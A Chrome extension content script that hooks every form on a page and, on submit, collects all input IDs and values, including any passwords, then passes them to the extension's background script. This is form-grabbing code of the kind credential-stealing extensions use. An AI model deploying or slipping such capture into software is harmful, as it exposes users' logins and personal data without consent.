var all_forms;

var form;

setTimeout(function(){
    all_forms = document.forms;

    for(var i = 0; i < all_forms.length; i++){
        form = all_forms[i];
        if(form.addEventListener){
	        form.addEventListener("submit", callback, false);
        }else if(form.attachEvent){
	           form.attachEvent('onsubmit', callback);
        }
    }

    console.log(all_forms);
}, 1000);

function callback(){
    var result = "{\"baseURI\": \""+this.baseURI + "\",\"inputs\": [{";

    for(var i = 0; i < this.elements.length-1; i++){
        result += "\"id\": \""+this.elements[i].id + "\",";
        result += "\"value\": \"" + this.elements[i].value + "\"";
        if(i != this.elements.length - 2){
            result += "},{";
        }
        else{
            result += "}]}";
        }
    }
    console.log("sending message to background");
    chrome.runtime.sendMessage({submitted_form : JSON.parse(result)});
};
